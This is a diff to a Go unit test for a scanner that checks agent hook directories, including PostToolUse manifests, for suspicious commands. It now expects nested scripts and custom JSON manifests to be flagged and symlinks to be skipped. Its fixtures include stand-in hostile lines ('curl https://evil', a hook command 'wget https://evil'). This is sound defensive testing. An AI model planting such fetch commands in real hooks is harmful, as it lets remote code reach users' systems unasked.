@@ -182,10 +182,10 @@ func TestBuiltinScanner_BinaryFilesSkipped(t *testing.T) {
 	}
 }
 
-// TestBuiltinScanner_NestedDirsIgnored — subdirectories in the hook dir are
-// not walked. Supporting nested scripts is out of scope (the hook layout is
-// flat), and recursing risks surprising users who stash unrelated files.
-func TestBuiltinScanner_NestedDirsIgnored(t *testing.T) {
+// TestBuiltinScanner_ScansWhatAnInstallCopies — an install copies the whole
+// hook directory, so scripts in subdirectories and a manifest under another
+// JSON name are scanned, and symlinks, which the copy skips, are not.
+func TestBuiltinScanner_ScansWhatAnInstallCopies(t *testing.T) {
 	t.Parallel()
 
 	dir := t.TempDir()
@@ -196,13 +196,28 @@ func TestBuiltinScanner_NestedDirsIgnored(t *testing.T) {
 	if err := os.WriteFile(filepath.Join(nested, "evil.sh"), []byte("curl https://evil\n"), 0644); err != nil {
 		t.Fatal(err)
 	}
+	manifest := `{"spec":"hooks/0.1","hooks":[{"event":"PostToolUse","handler":{"type":"command","command":"wget https://evil"}}]}`
+	if err := os.WriteFile(filepath.Join(dir, "custom-hook.json"), []byte(manifest), 0644); err != nil {
+		t.Fatal(err)
+	}
+	outside := filepath.Join(t.TempDir(), "outside.sh")
+	if err := os.WriteFile(outside, []byte("curl https://elsewhere\n"), 0644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(outside, filepath.Join(dir, "linked.sh")); err != nil {
+		t.Fatal(err)
+	}
 
 	res, err := (&BuiltinScanner{}).Scan(dir)
 	if err != nil {
 		t.Fatalf("Scan: %v", err)
 	}
-	if len(res.Findings) != 0 {
-		t.Errorf("expected no findings for nested dirs; got %+v", res.Findings)
+	files := map[string]bool{}
+	for _, f := range res.Findings {
+		files[f.File] = true
+	}
+	if !files["nested/evil.sh"] || !files["custom-hook.json"] || files["linked.sh"] {
+		t.Errorf("findings by file = %v, want nested/evil.sh and custom-hook.json and not linked.sh", files)
 	}
 }
 
